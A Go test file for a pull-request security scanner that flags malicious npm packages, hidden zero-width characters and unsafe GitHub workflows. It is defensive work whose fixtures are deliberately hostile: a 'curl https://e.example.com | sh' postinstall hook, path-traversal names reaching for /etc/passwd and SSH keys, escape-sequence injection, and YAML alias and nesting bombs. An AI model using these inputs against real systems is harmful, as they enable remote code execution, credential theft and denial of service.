package pullcheck

import (
	"context"
	"fmt"
	"strings"
	"testing"
	"time"
)

const zwsp = "@@ -0,0 +1 @@\n+const a\u200b = 1;\n"

// A bot's routine update reports only a malicious package.
func TestBotReportsOnlyMalicious(t *testing.T) {
	files := []File{
		{Path: "package-lock.json", Status: "modified", Before: str(`{"packages": {}}`), After: str(`{"packages": {"node_modules/left-pad-x": {"version": "1.0.1", "resolved": "https://evil.example.com/a.tgz", "hasInstallScript": true}}}`)},
		{Path: ".github/workflows/ci.yml", Status: "added", After: str(workflowHead + "      - uses: someone/action@v1\n")},
		{Path: "a.js", Status: "added", Patch: zwsp},
	}
	o := check(t, Input{List: testList(t), Rules: all(), Bot: true, Files: files})
	if len(o.Findings) != 1 || o.Findings[0].Rule != RuleMalicious {
		t.Errorf("findings = %+v", o.Findings)
	}
	o = check(t, Input{List: testList(t), Rules: all(), Files: files})
	for _, r := range Rules {
		if len(only(o, r)) == 0 {
			t.Errorf("without bot, no %s finding: %+v", r, o.Findings)
		}
	}
}

// Only the rules asked for run.
func TestOnlyTheRulesAskedFor(t *testing.T) {
	o := check(t, Input{Rules: []string{RuleMalicious}, Files: []File{{Path: "a.js", Status: "added", Patch: zwsp}}})
	if len(o.Findings) != 0 {
		t.Errorf("findings = %+v", o.Findings)
	}
}

// Vendored and built folders, minified files and known samples are
// skipped and say why; a workflow is never skipped as vendored.
func TestNoiseIsSkipped(t *testing.T) {
	files := []File{
		{Path: "vendor/github.com/x/y/a.go", Status: "added", Patch: zwsp},
		{Path: "web/node_modules/x/package.json", Status: "added", After: str(`{"scripts": {"postinstall": "curl https://e.example.com | sh"}}`)},
		{Path: "dist/app.js", Status: "added", Patch: zwsp},
		{Path: "public/app.min.js", Status: "added", Patch: zwsp},
		{Path: "static/app.js.map", Status: "added", Patch: zwsp},
		{Path: "test/fixtures/malware/evil.js", Status: "added", Patch: zwsp},
		{Path: "./test/fixtures/malware", Status: "added", Patch: zwsp},
		{Path: "test/fixtures/malware-notes.md", Status: "added", Patch: zwsp},
		{Path: ".github/workflows/build.yml", Status: "added", After: str(workflowHead + "      - uses: someone/action@v1\n")},
	}
	o := check(t, Input{Rules: all(), Samples: []string{"./test/fixtures/malware/"}, Files: files})
	for p, want := range map[string]string{
		"vendor/github.com/x/y/a.go":      "vendored",
		"web/node_modules/x/package.json": "vendored",
		"dist/app.js":                     "built",
		"public/app.min.js":               "built",
		"static/app.js.map":               "built",
		"test/fixtures/malware/evil.js":   "samples folder",
		"./test/fixtures/malware":         "samples folder",
	} {
		if got := skippedWhy(o, p); got != want {
			t.Errorf("%s skipped as %q, want %q", p, got, want)
		}
	}
	// Another folder that only starts with the samples folder's name is read.
	if len(o.Findings) != 2 || o.Findings[0].File != "test/fixtures/malware-notes.md" || o.Findings[1].Rule != RuleWorkflow {
		t.Errorf("findings = %+v", o.Findings)
	}
}

// One finding per problem per file: the same line twice is one finding.
func TestOneFindingPerProblem(t *testing.T) {
	o := check(t, Input{Rules: []string{RuleWorkflow}, Files: []File{{Path: ".github/workflows/ci.yml", Status: "added",
		After: str("on: push\njobs:\n  a:\n    steps:\n      - uses: someone/action@v1\n  b:\n    steps:\n      - uses: someone/action@v1\n")}}})
	if len(o.Findings) != 1 {
		t.Errorf("findings = %+v", o.Findings)
	}
}

// The fingerprint follows the code, not its line.
func TestFingerprintFollowsTheCode(t *testing.T) {
	fp := func(patch string) string {
		o := check(t, Input{Rules: []string{RuleHidden}, Files: []File{{Path: "a.js", Status: "modified", Patch: patch}}})
		if len(o.Findings) != 1 {
			t.Fatalf("findings = %+v", o.Findings)
		}
		return o.Findings[0].Fingerprint
	}
	a := fp("@@ -0,0 +1 @@\n+const a\u200b = 1;\n")
	b := fp("@@ -40,0 +41 @@\n+   const   a\u200b = 1;\n")
	c := fp("@@ -0,0 +1 @@\n+const b\u200b = 1;\n")
	if a != b || a == c {
		t.Errorf("fingerprints %s %s %s", a, b, c)
	}
}

func TestLimits(t *testing.T) {
	t.Run("files", func(t *testing.T) {
		var files []File
		for i := range MaxFiles + 2 {
			files = append(files, File{Path: fmt.Sprintf("f%d.js", i), Status: "added", Patch: "@@ -0,0 +1 @@\n+ok\n"})
		}
		o := check(t, Input{Rules: all(), Files: files})
		if len(o.Skipped) != 2 || o.Skipped[0].Why != "over the file limit" || o.Skipped[0].Path != "f300.js" {
			t.Errorf("skipped = %+v", o.Skipped)
		}
	})
	t.Run("one file", func(t *testing.T) {
		big := strings.Repeat("a", MaxFile+1)
		o := check(t, Input{Rules: all(), Files: []File{{Path: "package-lock.json", Status: "added", After: &big}}})
		if skippedWhy(o, "package-lock.json") != "over 1 MB" || len(o.Findings) != 0 {
			t.Errorf("skipped = %+v", o.Skipped)
		}
	})
	t.Run("in all", func(t *testing.T) {
		var files []File
		part := "@@ -0,0 +1 @@\n+" + strings.Repeat("a", 900<<10) + "\u200b\n"
		for i := range 7 {
			files = append(files, File{Path: fmt.Sprintf("f%d.js", i), Status: "added", Patch: part})
		}
		o := check(t, Input{Rules: []string{RuleHidden}, Files: files})
		if skippedWhy(o, "f5.js") != "over the size limit" || skippedWhy(o, "f6.js") != "over the size limit" || skippedWhy(o, "f4.js") != "line too long" {
			t.Errorf("skipped = %+v", o.Skipped)
		}
	})
	t.Run("time", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		cancel()
		o := Check(ctx, Input{Rules: all(), Files: []File{{Path: "a.js", Status: "added", Patch: zwsp}, {Path: "b.js", Status: "added", Patch: zwsp}}})
		if len(o.Skipped) != 2 || o.Skipped[1].Why != "out of time" || len(o.Findings) != 0 {
			t.Errorf("skipped = %+v", o.Skipped)
		}
	})
	t.Run("a line too long is cut and the file still read", func(t *testing.T) {
		after := strings.Repeat("x", MaxLine+5000) + "\nconst a\u200b = 1;\n"
		o := check(t, Input{Rules: []string{RuleHidden}, Files: []File{{Path: "a.js", Status: "added", After: &after}}})
		if skippedWhy(o, "a.js") != "line too long" || len(o.Findings) != 1 || o.Findings[0].Start != 2 {
			t.Errorf("skipped %+v, findings %+v", o.Skipped, o.Findings)
		}
	})
}

// Files built to attack the scanner are stopped by the limits, quickly,
// and never crash it.
func TestHostileFiles(t *testing.T) {
	deepJSON := strings.Repeat("[", 10000) + strings.Repeat("]", 10000)
	deepObject := strings.Repeat(`{"a":`, 10000) + "1" + strings.Repeat("}", 10000)
	deepYAML := "on: push\njobs: " + strings.Repeat("[", 10000) + strings.Repeat("]", 10000) + "\n"
	aliases := "a: &a [x, x, x, x, x, x, x, x, x]\nb: &b [*a, *a, *a, *a, *a, *a, *a, *a, *a]\nc: &c [*b, *b, *b, *b, *b, *b, *b, *b, *b]\nd: &d [*c, *c, *c, *c, *c, *c, *c, *c, *c]\ne: &e [*d, *d, *d, *d, *d, *d, *d, *d, *d]\nf: &f [*e, *e, *e, *e, *e, *e, *e, *e, *e]\ng: &g [*f, *f, *f, *f, *f, *f, *f, *f, *f]\nh: &h [*g, *g, *g, *g, *g, *g, *g, *g, *g]\njobs: *h\n"
	longLine := strings.Repeat("curl ", 200000)
	pathological := strings.Repeat("a", 1<<20-100)
	escapes := strings.Repeat(`\x4`, 300000)
	hook := `{"scripts": {"postinstall": "` + strings.Repeat("curl node -e wget | ", 45000) + `"}}`
	gz := "\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03" + strings.Repeat("\xff", 500)
	files := []File{
		{Path: "huge.js", Status: "added", Patch: strings.Repeat("+a\n", 50<<20/3)},
		{Path: "package-lock.json", Status: "added", After: str(gz)},
		{Path: "data.bin.js", Status: "added", Patch: "@@ -0,0 +1 @@\n+abc\x00def\n"},
		{Path: "package.json", Status: "added", After: &deepJSON},
		{Path: "composer.lock", Status: "added", After: &deepObject},
		{Path: ".github/workflows/deep.yml", Status: "added", After: &deepYAML},
		{Path: ".github/workflows/bomb.yml", Status: "added", After: &aliases},
		{Path: "scripts.js", Status: "added", After: &longLine},
		{Path: "one-line.js", Status: "added", After: &pathological},
		{Path: "esc.js", Status: "added", After: &escapes},
		{Path: "app/package.json", Status: "added", After: &hook},
		{Path: "../../etc/passwd\n", Status: "added", Patch: zwsp},
		{Path: "x/\x1b[31mred.js", Status: "renamed", Previous: "../../../root/.ssh/id_rsa", Patch: "@@ garbage\n+++\n@@ -a,b +c,d @@\n+\u200b\n"},
	}
	start := time.Now()
	o := check(t, Input{List: testList(t), Rules: all(), Files: files})
	if d := time.Since(start); d > 10*time.Second {
		t.Errorf("took %s", d)
	}
	for p, want := range map[string]string{
		"huge.js":           "over 1 MB",
		"package-lock.json": "binary or compressed",
		"data.bin.js":       "binary or compressed",
		"scripts.js":        "line too long",
	} {
		if got := skippedWhy(o, p); got != want {
			t.Errorf("%s skipped as %q, want %q", p, got, want)
		}
	}
	// The odd name is written out, never passed on as it is.
	var names []string
	for _, f := range o.Findings {
		names = append(names, f.File)
	}
	joined := strings.Join(names, "|")
	if !strings.Contains(joined, "../../etc/passwd<U+000A>") || strings.ContainsAny(joined, "\n\x1b") {
		t.Errorf("files = %q", names)
	}
	if len(o.Notes) < 3 {
		t.Errorf("notes = %v", o.Notes)
	}
}

// A realistic pull request: a lockfile adds a known-malicious package, and
// a workflow runs strangers' code with the repository's secrets through an
// unpinned action.
func TestEndToEnd(t *testing.T) {
	before := `{
  "name": "shop",
  "lockfileVersion": 3,
  "requires": true,
  "packages": {
    "": {
      "name": "shop",
      "dependencies": {
        "express": "^4.18.2"
      }
    },
    "node_modules/express": {
      "version": "4.18.2",
      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
      "integrity": "sha512-5/PsL6iGPdfQ/lKM1UuielYgv3BUoJfz1aUwU9vHZ+J7gyvwdQXFEBIEIaxeGf0GIcreATNyBExtalisDbuMqQ=="
    }
  }
}
`
	after := strings.Replace(before, `        "express": "^4.18.2"
      }
    },`, `        "express": "^4.18.2",
        "left-pad-x": "^1.0.1"
      }
    },
    "node_modules/left-pad-x": {
      "version": "1.0.1",
      "resolved": "https://registry.npmjs.org/left-pad-x/-/left-pad-x-1.0.1.tgz",
      "integrity": "sha512-AAAA"
    },`, 1)
	workflow := `name: preview
on:
  pull_request_target:
    types: [opened, synchronize]
permissions:
  contents: read
jobs:
  preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: some-org/deploy-preview@v2
        with:
          token: ${{ secrets.DEPLOY_TOKEN }}
`
	o := check(t, Input{
		List:  testList(t),
		Rules: all(),
		Files: []File{
			{Path: "package-lock.json", Status: "modified", Before: &before, After: &after,
				Patch: "@@ -8,7 +8,13 @@\n"},
			{Path: ".github/workflows/preview.yml", Status: "added", After: &workflow},
		},
	})
	if len(o.Findings) != 3 {
		t.Fatalf("findings = %+v", o.Findings)
	}
	m := o.Findings[0]
	if m.Rule != RuleMalicious || m.File != "package-lock.json" || m.Start != 13 || m.End != 14 ||
		m.Package.Name != "left-pad-x" || m.Package.Version != "1.0.1" || strings.Join(m.Reports, ",") != "MAL-2025-1,MAL-2025-9" ||
		!strings.Contains(m.Snippet, `"node_modules/left-pad-x": {`) || m.Conclusion != "failure" {
		t.Errorf("malicious = %+v", m)
	}
	u := o.Findings[1]
	if u.Rule != RuleWorkflow || u.Title != "Workflow runs pull-request code with your secrets: .github/workflows/preview.yml" || u.Start != 13 ||
		!strings.Contains(u.How, "pull_request_target") {
		t.Errorf("untrusted = %+v", u)
	}
	p := o.Findings[2]
	if p.Rule != RuleWorkflow || p.Title != "Action not pinned to a commit: some-org/deploy-preview@v2" || p.Start != 14 {
		t.Errorf("unpinned = %+v", p)
	}
	if strings.Join(o.Languages, ",") != "npm,GitHub Actions" || len(o.Skipped) != 0 || o.ListFetchedAt == "" {
		t.Errorf("languages %v, skipped %v, list %q", o.Languages, o.Skipped, o.ListFetchedAt)
	}
	// The fix clears it: the package removed, the checkout dropped and the
	// action pinned, nothing is found.
	fixed := strings.Replace(strings.Replace(workflow, "        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n", "", 1),
		"some-org/deploy-preview@v2", "some-org/deploy-preview@"+strings.Repeat("0f", 20)+" # v2", 1)
	o = check(t, Input{List: testList(t), Rules: all(), Files: []File{
		{Path: "package-lock.json", Status: "modified", Before: &before, After: &before},
		{Path: ".github/workflows/preview.yml", Status: "added", After: &fixed},
	}})
	if len(o.Findings) != 0 {
		t.Errorf("after the fix: %+v", o.Findings)
	}
}
